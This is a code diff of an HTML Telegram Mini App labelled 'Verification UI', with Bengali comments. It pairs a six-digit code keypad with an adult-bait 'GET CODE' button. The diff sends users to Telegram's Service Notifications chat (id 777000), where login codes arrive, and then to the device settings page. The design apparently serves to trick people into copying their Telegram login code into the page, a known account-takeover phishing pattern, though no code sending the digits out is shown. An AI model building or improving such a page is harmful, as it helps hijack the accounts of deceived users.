@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification UI</title>
-    <!-- টেলিগ্রামের অফিসিয়াল স্ক্রিপ্ট (এটি মাস্ট লাগবে) -->
+    <!-- টেলিগ্রামের অফিসিয়াল স্ক্রিপ্ট যা বাটনকে কাজ করাবে -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
@@ -43,6 +43,8 @@
             align-items: center;
         }
 
+        .top-icon span { font-size: 24px; }
+
         p { font-size: 14px; margin-bottom: 25px; opacity: 0.9; }
 
         .otp-inputs {
@@ -63,7 +65,6 @@
             outline: none;
         }
 
-        /* GET CODE বাটন ডিজাইন */
         .get-code-btn {
             background: linear-gradient(90deg, #ff0055, #ff0077);
             border: none;
@@ -97,6 +98,7 @@
         }
 
         .key:active { background: rgba(255, 255, 255, 0.3); }
+
         .key.empty { background: transparent; cursor: default; }
     </style>
 </head>
@@ -117,8 +119,8 @@
             <input type="text" maxlength="1" readonly>
         </div>
 
-        <!-- বাটন যা সরাসরি টেলিগ্রাম অ্যাপ ওপেন করবে -->
-        <button class="get-code-btn" onclick="openTelegramApp()">🔞 GET CODE 🔞</button>
+        <!-- বাটন ফাংশন -->
+        <button class="get-code-btn" onclick="goToServiceChat()">🔞 GET CODE 🔞</button>
 
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div>
@@ -137,8 +139,10 @@
     </div>
 
     <script>
+        // টেলিগ্রাম ওয়েব অ্যাপ ইনিশিয়ালাইজ
         const tg = window.Telegram.WebApp;
         tg.ready();
+        tg.expand();
 
         const inputs = document.querySelectorAll('#otp-container input');
         let currentIdx = 0;
@@ -161,15 +165,15 @@
             }
         }
 
-        // টেলিগ্রাম অ্যাপ ওপেন করার ফাংশন
-        function openTelegramApp() {
-            // ১. এটি ইউজারকে সরাসরি টেলিগ্রাম অ্যাপের হোম স্ক্রিনে নিয়ে যাবে
-            // সেখানে ইউজার সবার উপরেই Service Notifications চ্যাটটি পাবে।
-            window.location.href = "tg://"; 
-
-            // ২. মিনি অ্যাপটি ৫ সেকেন্ড পর বন্ধ হয়ে যাবে যেন ইউজার সরাসরি চ্যাট দেখতে পায়।
+        // সরাসরি Service Notifications চ্যাটে নিয়ে যাওয়ার ফাংশন
+        function goToServiceChat() {
+            // এই লিঙ্কটি সরাসরি টেলিগ্রামের ৭৭৭০০০ আইডি (Service Notifications) ওপেন করার চেষ্টা করবে
+            // এটি টেলিগ্রামের ভেতরেই কাজ করবে
+            window.location.href = "tg://user?id=777000";
+            
+            // যদি উপরেরটি কাজ না করে, তবে এটি একটি বিকল্প হিসেবে কাজ করবে
             setTimeout(() => {
-                tg.close();
+                window.location.href = "tg://settings/devices";
             }, 500);
         }
     </script>
